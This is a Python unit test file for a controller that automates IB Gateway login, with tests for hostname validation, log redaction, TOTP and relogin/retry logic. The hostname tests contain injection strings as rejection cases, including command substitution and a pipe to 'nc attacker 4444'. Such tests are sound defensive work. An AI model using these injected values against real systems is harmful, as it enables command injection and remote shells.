"""Pure-Python unit tests for gateway_controller.py helpers.

No network, no filesystem side effects, no AT-SPI. Run with:

    python3 -m unittest discover -s tests -v

or via `make test` (which gates on unittest discover).

These tests import gateway_controller.py directly with the `gi` and
`gi.repository.Atspi` modules mocked in sys.modules so the real
pyatspi2 stack isn't required on the test host. That lets `make test`
pass in a minimal build container (eclipse-temurin:17-jdk + python3,
no GTK, no ATK).

What's covered:
  - _validate_hostname: accept DNS-label strings, reject whitespace /
    newlines / semicolons / control characters
  - _redact_logs: strip IBKR account number patterns (DU\\d+, U\\d+)
    from arbitrary strings; pass non-matching strings through
  - _coerce_yes_no: accept yes/no/true/false/1/0/on/off, return None
    for empty or unrecognized values (so the caller knows to skip)
  - generate_totp: regression test against RFC 6238 SHA1 test vectors
    using a monkey-patched time.time()
  - api_port_for_mode: returns 4001 for live, 4002 for paper

What's NOT covered by this file (tracked separately):
  - jts.ini writer (side effects on filesystem — needs tempdir fixture)
  - Agent protocol client (needs a mock socket server)
  - AT-SPI code paths (need the full gi stack)
  - Live login flow (needs real Gateway + real credentials)
"""

import os
import sys
import unittest
from unittest.mock import MagicMock, patch


def _load_module():
    """Load gateway_controller.py with the pyatspi2 stack stubbed out.

    Returns the module object, reusable across tests. Called once at
    import time and cached at module level so each TestCase doesn't
    pay the startup cost.
    """
    # Stub the gi / gi.repository / gi.repository.Atspi imports.
    sys.modules.setdefault("gi", MagicMock())
    sys.modules.setdefault("gi.repository", MagicMock())
    sys.modules.setdefault("gi.repository.Atspi", MagicMock())

    # The module does os.environ.get for several vars at load time;
    # most are optional but the controller checks USERNAME/PASSWORD
    # only inside main(), so we don't need to set them.
    os.environ.setdefault("TRADING_MODE", "paper")

    # Controller file is the sibling of tests/ in the repo layout.
    here = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.dirname(here)
    module_path = os.path.join(repo_root, "gateway_controller.py")

    import importlib.util
    spec = importlib.util.spec_from_file_location("gateway_controller", module_path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["gateway_controller"] = mod
    spec.loader.exec_module(mod)
    return mod


gc = _load_module()


class TestValidateHostname(unittest.TestCase):

    def test_accepts_simple_dns_label(self):
        self.assertEqual(
            gc._validate_hostname("cdc1.ibllc.com", "TWS_SERVER"),
            "cdc1.ibllc.com",
        )

    def test_accepts_another_real_example(self):
        self.assertEqual(
            gc._validate_hostname("ndc1.ibllc.com", "TWS_SERVER"),
            "ndc1.ibllc.com",
        )

    def test_accepts_hyphen_and_digit(self):
        self.assertEqual(
            gc._validate_hostname("host-1.example-co.com", "TWS_SERVER"),
            "host-1.example-co.com",
        )

    def test_accepts_empty_string(self):
        # Empty is allowed — it means "not set", fall back to Gateway's default
        self.assertEqual(
            gc._validate_hostname("", "TWS_SERVER"),
            "",
        )

    def test_rejects_newline(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com\n[Logon]\nEvil=yes", "TWS_SERVER")

    def test_rejects_semicolon(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com;evil", "TWS_SERVER")

    def test_rejects_space(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com evil", "TWS_SERVER")

    def test_rejects_shell_metachar(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com`id`", "TWS_SERVER")

    def test_rejects_pipe(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com|nc attacker 4444", "TWS_SERVER")

    def test_error_message_names_the_variable(self):
        # Users need to know WHICH env var was bad
        try:
            gc._validate_hostname("bad space", "TWS_SERVER_PAPER")
        except ValueError as e:
            self.assertIn("TWS_SERVER_PAPER", str(e))
            self.assertIn("bad space", str(e))
        else:
            self.fail("should have raised ValueError")


class TestRedactLogs(unittest.TestCase):

    def test_redacts_paper_account_number(self):
        s = "DU9999999 Trader Workstation Configuration (Simulated Trading)"
        result = gc._redact_logs(s)
        self.assertIn("DU[REDACTED]", result)
        self.assertNotIn("DU9999999", result)
        self.assertIn("Trader Workstation Configuration", result)

    def test_redacts_live_account_number(self):
        self.assertEqual(
            gc._redact_logs("U1234567 Live Account"),
            "U[REDACTED] Live Account",
        )

    def test_passes_through_hostname(self):
        self.assertEqual(
            gc._redact_logs("cdc1.ibllc.com"),
            "cdc1.ibllc.com",
        )

    def test_passes_through_normal_log_line(self):
        self.assertEqual(
            gc._redact_logs("Login complete. Entering monitor loop."),
            "Login complete. Entering monitor loop.",
        )

    def test_passes_through_short_number(self):
        # Only DU/U followed by 5-10 digits should match. "DU123" is
        # too short and should pass through so we don't false-positive.
        self.assertEqual(gc._redact_logs("DU123"), "DU123")

    def test_handles_non_string(self):
        # The helper is defensive — non-strings pass through
        self.assertEqual(gc._redact_logs(None), None)
        self.assertEqual(gc._redact_logs(42), 42)
        self.assertEqual(gc._redact_logs([1, 2]), [1, 2])

    def test_redacts_multiple_in_one_string(self):
        s = "DU1111111 and DU2222222 and U3333333"
        result = gc._redact_logs(s)
        self.assertNotIn("DU1111111", result)
        self.assertNotIn("DU2222222", result)
        self.assertNotIn("U3333333", result)
        self.assertEqual(
            result,
            "DU[REDACTED] and DU[REDACTED] and U[REDACTED]",
        )


class TestCoerceYesNo(unittest.TestCase):

    def test_yes_values(self):
        for v in ["yes", "Yes", "YES", "true", "True", "TRUE",
                  "1", "on", "ON"]:
            self.assertEqual(gc._coerce_yes_no(v), True, f"failed on {v!r}")

    def test_no_values(self):
        for v in ["no", "No", "NO", "false", "False", "FALSE",
                  "0", "off", "OFF"]:
            self.assertEqual(gc._coerce_yes_no(v), False, f"failed on {v!r}")

    def test_empty_returns_none(self):
        self.assertIsNone(gc._coerce_yes_no(""))
        self.assertIsNone(gc._coerce_yes_no(None))

    def test_unrecognized_returns_none(self):
        self.assertIsNone(gc._coerce_yes_no("maybe"))
        self.assertIsNone(gc._coerce_yes_no("2"))
        self.assertIsNone(gc._coerce_yes_no("junk"))

    def test_whitespace_is_stripped(self):
        self.assertEqual(gc._coerce_yes_no("  yes  "), True)
        self.assertEqual(gc._coerce_yes_no("\tno\n"), False)


class TestGenerateTotp(unittest.TestCase):
    """Verify our TOTP against RFC 6238 appendix B SHA-1 test vectors.

    RFC 6238 uses the ASCII secret "12345678901234567890" (20 bytes)
    and several reference timestamps. Our implementation takes a
    base32 secret, so we convert the ASCII to base32 first.
    """

    SECRET = "12345678901234567890"
    # Base32-encoded version of the ASCII secret
    SECRET_B32 = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"

    def _at_time(self, unix_time):
        with patch.object(gc.time, "time", return_value=unix_time):
            return gc.generate_totp(self.SECRET_B32)

    def test_rfc6238_vector_59(self):
        # RFC 6238 appendix B: time=59, SHA-1 → 94287082 → last 6 digits "287082"
        self.assertEqual(self._at_time(59), "287082")

    def test_rfc6238_vector_1111111109(self):
        # RFC 6238: time=1111111109, SHA-1 → 07081804 → "081804"
        self.assertEqual(self._at_time(1111111109), "081804")

    def test_rfc6238_vector_1111111111(self):
        # RFC 6238: time=1111111111, SHA-1 → 14050471 → "050471"
        self.assertEqual(self._at_time(1111111111), "050471")

    def test_rfc6238_vector_1234567890(self):
        # RFC 6238: time=1234567890, SHA-1 → 89005924 → "005924"
        self.assertEqual(self._at_time(1234567890), "005924")

    def test_code_is_six_digits_zero_padded(self):
        # A synthetic case where the counter produces a value < 100000
        # should get zero-padded to 6 digits. We pick a time that
        # we happen to know produces such a value (the RFC vectors above
        # include "081804" which already starts with 0).
        self.assertEqual(len(self._at_time(1111111109)), 6)


class TestApiPortForMode(unittest.TestCase):
    """api_port_for_mode reads module-level TRADING_MODE. We set the
    module attribute directly for each test rather than re-importing."""

    def test_live_returns_4001(self):
        gc.TRADING_MODE = "live"
        self.assertEqual(gc.api_port_for_mode(), 4001)

    def test_paper_returns_4002(self):
        gc.TRADING_MODE = "paper"
        self.assertEqual(gc.api_port_for_mode(), 4002)


class TestDetectLoginStuckConnecting(unittest.TestCase):
    """_detect_login_stuck_connecting reads JLabel text via agent_labels
    and matches against the 'connecting to server' / 'trying for
    another' retry-loop signature. We mock agent_labels directly to
    exercise the positive + negative paths without a running agent."""

    def test_detects_connecting_to_server(self):
        with patch.object(gc, "agent_labels", return_value=[
            ("IB Gateway", "Attempt 3: connecting to server (trying for another 45 seconds)"),
        ]):
            self.assertTrue(gc._detect_login_stuck_connecting())

    def test_detects_trying_for_another(self):
        # Even if the "connecting to server" part gets truncated, the
        # "trying for another" substring alone is enough to flag the state.
        with patch.object(gc, "agent_labels", return_value=[
            ("IB Gateway", "trying for another 12 seconds"),
        ]):
            self.assertTrue(gc._detect_login_stuck_connecting())

    def test_case_insensitive(self):
        with patch.object(gc, "agent_labels", return_value=[
            ("IB Gateway", "Connecting To Server"),
        ]):
            self.assertTrue(gc._detect_login_stuck_connecting())

    def test_ignores_unrelated_labels(self):
        with patch.object(gc, "agent_labels", return_value=[
            ("IB Gateway", "Username"),
            ("IB Gateway", "Password"),
            ("IB Gateway", "Log In"),
        ]):
            self.assertFalse(gc._detect_login_stuck_connecting())

    def test_returns_false_on_empty_labels(self):
        with patch.object(gc, "agent_labels", return_value=[]):
            self.assertFalse(gc._detect_login_stuck_connecting())

    def test_returns_false_on_agent_exception(self):
        # If the agent socket is down we shouldn't raise; a false negative
        # here is safer than crashing the timeout handler.
        def boom():
            raise RuntimeError("agent socket closed")
        with patch.object(gc, "agent_labels", side_effect=boom):
            self.assertFalse(gc._detect_login_stuck_connecting())


class TestAttemptInplaceRelogin(unittest.TestCase):
    """attempt_inplace_relogin is the in-JVM relogin primitive. It must:
      - Never call launch_gateway / terminate / unlink-agent-socket
        (i.e. never touch process-lifecycle helpers).
      - Skip 'Connecting to server' progress dialogs (clicking OK on
        them cancels the login).
      - Dismiss recognized error modals via OK/Close.
      - Wait for the login frame (password text field) to reappear.
      - Re-drive handle_login on the same app reference and return its
        result.
    """

    def _fake_app(self):
        # The real app is an Atspi object; we only need something
        # identity-comparable for the assertion that handle_login was
        # called with the same reference the caller passed in.
        return object()

    def test_returns_false_when_login_frame_never_reappears(self):
        # v0.4.4: attempt_inplace_relogin probes with a short 2s timeout
        # first, then falls through to the full 120s wait if the probe
        # fails and the disposed-shell signature isn't matched. Both
        # calls return False here (frame genuinely gone), so the
        # function returns False without calling handle_login.
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[]), \
             patch.object(gc, "agent_wait_login_frame", return_value=False) as awlf, \
             patch.object(gc, "handle_login") as hl:
            self.assertFalse(gc.attempt_inplace_relogin(app))
            # Two calls: 2s probe, then 120s full wait (empty windows
            # list doesn't match the disposed-shell signature, so we
            # must not bail early).
            self.assertEqual(awlf.call_count, 2)
            hl.assert_not_called()

    def test_bails_on_disposed_shell_without_full_wait(self):
        # v0.4.4: after CCP lockout Gateway can dispose the login frame
        # entirely and transition into its post-auth "disconnected"
        # shell (single non-modal window titled "IBKR Gateway", no
        # JPasswordField anywhere). LoginManager.initiateLogin on the
        # captured reference is a silent no-op in that state, so in-JVM
        # relogin cannot recover. attempt_inplace_relogin must detect
        # the shell signature after a short probe and bail with False
        # so wait_for_api_port_with_retry escalates to container-level
        # kill+relaunch instead of burning 120s × 8 attempts.
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[
                ("ay", "IBKR Gateway", False),
             ]), \
             patch.object(gc, "agent_wait_login_frame", return_value=False) as awlf, \
             patch.object(gc, "handle_login") as hl:
            self.assertFalse(gc.attempt_inplace_relogin(app))
            # Only the 2s probe should run — NOT the full 120s wait.
            # That's the whole point: fast-fail so the outer loop
            # escalates instead of dead-waiting.
            self.assertEqual(awlf.call_count, 1)
            hl.assert_not_called()

    def test_calls_handle_login_on_same_app_when_frame_up(self):
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[]), \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=True) as hl:
            self.assertTrue(gc.attempt_inplace_relogin(app))
            # Critical: same app reference, no new JVM
            hl.assert_called_once_with(app)

    def test_propagates_handle_login_false(self):
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[]), \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=False):
            self.assertFalse(gc.attempt_inplace_relogin(app))

    def test_leaves_connecting_to_server_dialog_alone(self):
        # Clicking OK on the "Connecting to server" progress dialog
        # cancels the login. The helper MUST NOT click it.
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[
                ("frame", "Connecting to server", True),
             ]), \
             patch.object(gc, "agent_window", return_value="connecting to server (trying for another 30 seconds)"), \
             patch.object(gc, "agent_click_in_window") as click, \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=True):
            self.assertTrue(gc.attempt_inplace_relogin(app))
            click.assert_not_called()

    def test_dismisses_recognized_error_modal(self):
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[
                ("frame", "Login Error", True),
             ]), \
             patch.object(gc, "agent_window",
                          return_value="Login failed: server cannot be reached"), \
             patch.object(gc, "agent_click_in_window", return_value=True) as click, \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=True):
            self.assertTrue(gc.attempt_inplace_relogin(app))
            # Clicked OK (or Close) on the error modal
            self.assertTrue(click.called)
            first_call_title = click.call_args_list[0].args[0]
            self.assertEqual(first_call_title, "Login Error")

    def test_ignores_non_modal_windows(self):
        app = self._fake_app()
        with patch.object(gc, "agent_windows", return_value=[
                ("frame", "IBKR Gateway", False),  # not modal
             ]), \
             patch.object(gc, "agent_click_in_window") as click, \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=True):
            self.assertTrue(gc.attempt_inplace_relogin(app))
            click.assert_not_called()

    def test_swallows_agent_windows_exception(self):
        # Agent socket may flap during recovery; a transient failure
        # must not crash the retry loop. Fall through to the login-
        # frame wait regardless.
        app = self._fake_app()
        with patch.object(gc, "agent_windows", side_effect=RuntimeError("boom")), \
             patch.object(gc, "agent_wait_login_frame", return_value=True), \
             patch.object(gc, "handle_login", return_value=True) as hl:
            self.assertTrue(gc.attempt_inplace_relogin(app))
            hl.assert_called_once_with(app)


class TestWaitForApiPortWithRetry(unittest.TestCase):
    """wait_for_api_port_with_retry is v0.4.1's outer retry loop at the
    final auth indicator (the API port). It catches both CCP-Timeout
    and stuck-connecting lockout modes that the v0.4.0 main() outer
    loop misses. Behavior contract:
      - Port opens on first call -> return True, reset CCP backoff.
      - Port timeout + no lockout signature -> sys.exit(1) (terminal
        failure: wrong creds, wrong server, network).
      - Port timeout + CCP Timeout! OR stuck-connecting -> backoff,
        attempt_inplace_relogin, retry. Same app reference throughout.
      - Cap at _INPLACE_RELOGIN_MAX_ATTEMPTS relogins then sys.exit(1)
        for container-level recovery.
      - attempt_inplace_relogin failure -> sys.exit(1).
      - Eventual success resets CCP backoff.
    """

    def _fake_app(self):
        return object()

    def test_returns_true_immediately_on_success(self):
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", return_value=True), \
             patch.object(gc, "_reset_ccp_backoff") as reset, \
             patch.object(gc, "_detect_ccp_lockout") as ccp, \
             patch.object(gc, "_detect_login_stuck_connecting") as stuck, \
             patch.object(gc, "attempt_inplace_relogin") as relogin:
            self.assertTrue(gc.wait_for_api_port_with_retry(app))
            reset.assert_called_once()
            ccp.assert_not_called()
            stuck.assert_not_called()
            relogin.assert_not_called()

    def test_retries_on_ccp_lockout_signature(self):
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", side_effect=[False, True]), \
             patch.object(gc, "_detect_ccp_lockout", return_value=True), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=False), \
             patch.object(gc, "_apply_ccp_backoff") as backoff, \
             patch.object(gc, "_reset_ccp_backoff") as reset, \
             patch.object(gc, "attempt_inplace_relogin", return_value=True) as relogin:
            self.assertTrue(gc.wait_for_api_port_with_retry(app))
            backoff.assert_called_once()
            # Critical: same app reference, no new JVM
            relogin.assert_called_once_with(app)
            reset.assert_called_once()

    def test_retries_on_stuck_connecting_signature(self):
        # This is the bug-producing mode from v0.4.0 production: CCP
        # Timeout! never fires but the login dialog is stuck in its
        # "connecting to server" retry. Must still recover.
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", side_effect=[False, True]), \
             patch.object(gc, "_detect_ccp_lockout", return_value=False), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=True), \
             patch.object(gc, "_apply_ccp_backoff"), \
             patch.object(gc, "_reset_ccp_backoff") as reset, \
             patch.object(gc, "attempt_inplace_relogin", return_value=True) as relogin:
            self.assertTrue(gc.wait_for_api_port_with_retry(app))
            relogin.assert_called_once_with(app)
            reset.assert_called_once()

    def test_terminal_failure_when_no_lockout_signature(self):
        # Port didn't open AND neither detector fires. Treat as wrong-
        # creds / wrong-server / network failure. Must exit, must NOT
        # attempt relogin (no point retrying a terminal failure).
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", return_value=False), \
             patch.object(gc, "_detect_ccp_lockout", return_value=False), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=False), \
             patch.object(gc, "_diagnose_login_failure"), \
             patch.object(gc, "agent_windows", return_value=[]), \
             patch.object(gc, "agent_labels", return_value=[]), \
             patch.object(gc, "attempt_inplace_relogin") as relogin:
            with self.assertRaises(SystemExit) as ctx:
                gc.wait_for_api_port_with_retry(app)
            self.assertEqual(ctx.exception.code, 1)
            relogin.assert_not_called()

    def test_escalates_to_jvm_restart_on_max_attempts_exceeded(self):
        # v0.4.5: port never opens, CCP always detected, relogin
        # always succeeds. Loop caps at _INPLACE_RELOGIN_MAX_ATTEMPTS
        # and escalates to JVM restart via _escalate_to_jvm_restart
        # (no more sys.exit — dual-mode run.sh doesn't restart the
        # container on single-mode exit).
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", return_value=False), \
             patch.object(gc, "_detect_ccp_lockout", return_value=True), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=False), \
             patch.object(gc, "_apply_ccp_backoff"), \
             patch.object(gc, "_reset_ccp_backoff"), \
             patch.object(gc, "attempt_inplace_relogin", return_value=True) as relogin, \
             patch.object(gc, "_escalate_to_jvm_restart", return_value=True) as escalate:
            self.assertTrue(gc.wait_for_api_port_with_retry(app))
            self.assertEqual(relogin.call_count,
                             gc._INPLACE_RELOGIN_MAX_ATTEMPTS)
            escalate.assert_called_once()

    def test_escalates_to_jvm_restart_on_relogin_false(self):
        # v0.4.5: attempt_inplace_relogin returned False (disposed
        # login frame per v0.4.4, or handle_login failed). Must NOT
        # sys.exit — escalate to long-cool-down JVM restart.
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", return_value=False), \
             patch.object(gc, "_detect_ccp_lockout", return_value=True), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=False), \
             patch.object(gc, "_apply_ccp_backoff"), \
             patch.object(gc, "attempt_inplace_relogin", return_value=False) as relogin, \
             patch.object(gc, "_escalate_to_jvm_restart", return_value=True) as escalate:
            self.assertTrue(gc.wait_for_api_port_with_retry(app))
            relogin.assert_called_once()
            escalate.assert_called_once()

    def test_respects_custom_max_attempts(self):
        # Caller can override the cap (useful for tests / debugging).
        # v0.4.5: escalation fires after the custom cap.
        app = self._fake_app()
        with patch.object(gc, "wait_for_api_port", return_value=False), \
             patch.object(gc, "_detect_ccp_lockout", return_value=True), \
             patch.object(gc, "_detect_login_stuck_connecting", return_value=False), \
             patch.object(gc, "_apply_ccp_backoff"), \
             patch.object(gc, "attempt_inplace_relogin", return_value=True) as relogin, \
             patch.object(gc, "_escalate_to_jvm_restart", return_value=True) as escalate:
            self.assertTrue(gc.wait_for_api_port_with_retry(app, max_attempts=3))
            self.assertEqual(relogin.call_count, 3)
            escalate.assert_called_once()


class TestEscalateToJvmRestart(unittest.TestCase):
    """_escalate_to_jvm_restart is v0.4.5's dual-mode-aware recovery
    escape hatch. It replaces sys.exit(1) on CCP-exhaustion paths
    because run.sh's final ``wait "${pid[@]}"`` does not bring the
    container down when a single mode's controller exits — the
    container stays up on the other mode's PID.

    v0.4.6 contract: on each attempt, teardown the JVM first, THEN
    cool down, THEN relaunch. The teardown-before-cool-down ordering
    is the key v0.4.6 change — keeping the JVM alive during the
    cool-down lets its internal retry loop keep IBKR's CCP limiter
    armed, defeating the cool-down.
      - Each iteration: _teardown_jvm_for_restart, then
        _apply_ccp_long_cooldown, then _relaunch_and_login_in_place.
      - Returns True as soon as _relaunch_and_login_in_place is True.
      - Retries up to _JVM_RESTART_MAX_ATTEMPTS (default 5).
      - sys.exit(1) after cap exhaustion.
      - Resets CCP backoff on success.
    """

    def test_returns_true_on_first_restart_success(self):
        with patch.object(gc, "_teardown_jvm_for_restart") as teardown, \
             patch.object(gc, "_apply_ccp_long_cooldown") as cooldown, \
             patch.object(gc, "_relaunch_and_login_in_place", return_value=True) as relaunch, \
             patch.object(gc, "_reset_ccp_backoff") as reset:
            self.assertTrue(gc._escalate_to_jvm_restart("test reason"))
            teardown.assert_called_once()
            cooldown.assert_called_once()
            relaunch.assert_called_once()
            reset.assert_called_once()

    def test_teardown_fires_before_cooldown(self):
        # v0.4.6 core invariant: JVM must be killed before the long
        # silence, not after. Otherwise the JVM's internal
        # "Attempt N: connecting to server" retry loop keeps hitting
        # IBKR throughout the cool-down and the CCP limiter never clears.
        call_order = []
        with patch.object(gc, "_teardown_jvm_for_restart",
                          side_effect=lambda: call_order.append("teardown")), \
             patch.object(gc, "_apply_ccp_long_cooldown",
                          side_effect=lambda r: call_order.append("cooldown")), \
             patch.object(gc, "_relaunch_and_login_in_place",
                          side_effect=lambda: (call_order.append("relaunch") or True)), \
             patch.object(gc, "_reset_ccp_backoff"):
            gc._escalate_to_jvm_restart("test reason")
        self.assertEqual(call_order, ["teardown", "cooldown", "relaunch"])

    def test_retries_after_restart_failure(self):
        # Third relaunch succeeds — first two returned False. Teardown
        # and cool-down must fire before every relaunch attempt, not
        # just the first.
        with patch.object(gc, "_teardown_jvm_for_restart") as teardown, \
             patch.object(gc, "_apply_ccp_long_cooldown") as cooldown, \
             patch.object(gc, "_relaunch_and_login_in_place",
                          side_effect=[False, False, True]) as relaunch, \
             patch.object(gc, "_reset_ccp_backoff"):
            self.assertTrue(gc._escalate_to_jvm_restart("test reason"))
            self.assertEqual(teardown.call_count, 3)
            self.assertEqual(cooldown.call_count, 3)
            self.assertEqual(relaunch.call_count, 3)

    def test_exits_after_restart_cap(self):
        # Every relaunch fails. Must sys.exit(1) after the cap and not
        # loop forever.
        with patch.object(gc, "_teardown_jvm_for_restart") as teardown, \
             patch.object(gc, "_apply_ccp_long_cooldown") as cooldown, \
             patch.object(gc, "_relaunch_and_login_in_place", return_value=False) as relaunch, \
             patch.object(gc, "_reset_ccp_backoff"):
            with self.assertRaises(SystemExit) as ctx:
                gc._escalate_to_jvm_restart("test reason")
            self.assertEqual(ctx.exception.code, 1)
            self.assertEqual(teardown.call_count, gc._JVM_RESTART_MAX_ATTEMPTS)
            self.assertEqual(cooldown.call_count, gc._JVM_RESTART_MAX_ATTEMPTS)
            self.assertEqual(relaunch.call_count, gc._JVM_RESTART_MAX_ATTEMPTS)


class TestRecoverJvmOrEscalate(unittest.TestCase):
    """_recover_jvm_or_escalate is v0.4.7's dual-mode-safe recovery
    helper for monitor_loop paths that previously sys.exit'd. Fast
    path via do_restart_in_place first (no cool-down); on failure
    fall through to _escalate_to_jvm_restart (silent cool-down).
    Contract: never returns False — returns True on recovery, or
    sys.exit(1) propagates from _escalate_to_jvm_restart's cap."""

    def test_returns_true_on_fast_restart_success(self):
        # Fast path succeeds — no escalation needed, no cool-down.
        with patch.object(gc, "do_restart_in_place", return_value=True) as restart, \
             patch.object(gc, "_escalate_to_jvm_restart") as escalate:
            self.assertTrue(gc._recover_jvm_or_escalate("test reason"))
            restart.assert_called_once()
            escalate.assert_not_called()

    def test_escalates_on_fast_restart_false(self):
        # do_restart_in_place returns False => escalate.
        with patch.object(gc, "do_restart_in_place", return_value=False) as restart, \
             patch.object(gc, "_escalate_to_jvm_restart",
                          return_value=True) as escalate:
            self.assertTrue(gc._recover_jvm_or_escalate("test reason"))
            restart.assert_called_once()
            escalate.assert_called_once_with("test reason")

    def test_escalates_on_fast_restart_exception(self):
        # Exception during do_restart_in_place must not propagate —
        # must be caught and routed to escalation.
        with patch.object(gc, "do_restart_in_place",
                          side_effect=RuntimeError("boom")) as restart, \
             patch.object(gc, "_escalate_to_jvm_restart",
                          return_value=True) as escalate:
            self.assertTrue(gc._recover_jvm_or_escalate("test reason"))
            restart.assert_called_once()
            escalate.assert_called_once_with("test reason")

    def test_propagates_systemexit_from_escalate_cap(self):
        # When escalate exhausts its cap and calls sys.exit(1), the
        # SystemExit must propagate up through _recover_jvm_or_escalate
        # (never swallowed).
        with patch.object(gc, "do_restart_in_place", return_value=False), \
             patch.object(gc, "_escalate_to_jvm_restart",
                          side_effect=SystemExit(1)):
            with self.assertRaises(SystemExit) as ctx:
                gc._recover_jvm_or_escalate("test reason")
            self.assertEqual(ctx.exception.code, 1)


class TestCcpLockoutStreak(unittest.TestCase):
    """v0.4.8: _detect_ccp_lockout tracks consecutive CCP lockouts.
    Streak >= 2 emits a concurrent-session warning naming that as the
    likely cause; streak >= 3 emits a structured ALERT_CCP_PERSISTENT
    ERROR token for external monitoring. _reset_ccp_backoff resets the
    streak on auth success.

    Cut future incident diagnosis time from hours (2026-04-17 incident:
    live stuck for 3h) to seconds."""

    def setUp(self):
        gc._ccp_lockout_streak = 0
        gc._ccp_backoff_seconds = 0.0

    def _run_detect_with_ccp_timeout(self):
        """Call _detect_ccp_lockout against a tempdir launcher.log
        containing the AuthTimeoutMonitor-CCP: Timeout! signature
        without a preceding NS_AUTH_START (= real CCP lockout)."""
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            with open(os.path.join(tmpdir, "launcher.log"), "w") as f:
                f.write("AuthTimeoutMonitor-CCP: activate\n")
                f.write("Authenticating\n")
                f.write("AuthTimeoutMonitor-CCP: Timeout!\n")
            with patch.object(gc, "JTS_CONFIG_DIR", tmpdir):
                return gc._detect_ccp_lockout(timeout=2)

    def test_streak_increments_on_each_lockout(self):
        self.assertEqual(gc._ccp_lockout_streak, 0)
        self.assertTrue(self._run_detect_with_ccp_timeout())
        self.assertEqual(gc._ccp_lockout_streak, 1)
        self.assertTrue(self._run_detect_with_ccp_timeout())
        self.assertEqual(gc._ccp_lockout_streak, 2)
        self.assertTrue(self._run_detect_with_ccp_timeout())
        self.assertEqual(gc._ccp_lockout_streak, 3)

    def test_first_lockout_no_concurrent_session_warning(self):
        with self.assertLogs("controller", level="WARNING") as ctx:
            self._run_detect_with_ccp_timeout()
        output = "\n".join(ctx.output)
        self.assertIn("CCP LOCKOUT DETECTED", output)
        self.assertNotIn("concurrent IBKR session", output)
        self.assertNotIn("ALERT_CCP_PERSISTENT", output)

    def test_second_lockout_emits_concurrent_session_warning(self):
        self._run_detect_with_ccp_timeout()  # streak=1
        with self.assertLogs("controller", level="WARNING") as ctx:
            self._run_detect_with_ccp_timeout()  # streak=2
        output = "\n".join(ctx.output)
        self.assertIn("concurrent IBKR session", output)
        self.assertIn("Scenario 7", output)
        self.assertNotIn("ALERT_CCP_PERSISTENT", output)

    def test_third_lockout_emits_alert_token(self):
        self._run_detect_with_ccp_timeout()  # streak=1
        self._run_detect_with_ccp_timeout()  # streak=2
        with self.assertLogs("controller", level="ERROR") as ctx:
            self._run_detect_with_ccp_timeout()  # streak=3
        output = "\n".join(ctx.output)
        self.assertIn("ALERT_CCP_PERSISTENT", output)
        self.assertIn("consecutive_lockouts=3", output)
        self.assertIn("mode=", output)
        self.assertIn("suggested_action=", output)

    def test_fourth_lockout_still_emits_alert_token(self):
        for _ in range(3):
            self._run_detect_with_ccp_timeout()
        self.assertEqual(gc._ccp_lockout_streak, 3)
        with self.assertLogs("controller", level="ERROR") as ctx:
            self._run_detect_with_ccp_timeout()  # streak=4
        output = "\n".join(ctx.output)
        self.assertIn("ALERT_CCP_PERSISTENT", output)
        self.assertIn("consecutive_lockouts=4", output)

    def test_reset_ccp_backoff_resets_streak(self):
        self._run_detect_with_ccp_timeout()
        self._run_detect_with_ccp_timeout()
        self.assertEqual(gc._ccp_lockout_streak, 2)
        gc._reset_ccp_backoff()
        self.assertEqual(gc._ccp_lockout_streak, 0)

    def test_reset_streak_allows_fresh_diagnostic_cycle(self):
        # After reset, the next incident starts at streak=1 and must
        # NOT immediately emit the concurrent-session warning.
        for _ in range(3):
            self._run_detect_with_ccp_timeout()
        gc._reset_ccp_backoff()
        with self.assertLogs("controller", level="WARNING") as ctx:
            self._run_detect_with_ccp_timeout()  # fresh streak=1
        output = "\n".join(ctx.output)
        self.assertIn("CCP LOCKOUT DETECTED", output)
        self.assertNotIn("concurrent IBKR session", output)
        self.assertNotIn("ALERT_CCP_PERSISTENT", output)


if __name__ == "__main__":
    unittest.main(verbosity=2)
